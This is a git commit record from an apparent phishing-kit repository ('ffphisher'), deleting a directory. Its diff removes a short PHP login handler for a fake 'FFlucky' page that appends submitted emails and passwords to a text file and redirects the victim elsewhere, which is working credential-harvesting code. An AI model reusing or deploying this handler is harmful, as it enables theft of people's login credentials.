7173988011dad625e11114ff36853317b527efa1
elitehacker03 <106663801+elitehacker03@users.noreply.github.com>
2022-06-09 13:42:30 +0530

    Delete ffphisher/sites directory

--- ffphisher/sites/FFlucky/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", " Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.idenna.com/congratulations-its-a-web');
-exit();
-?>
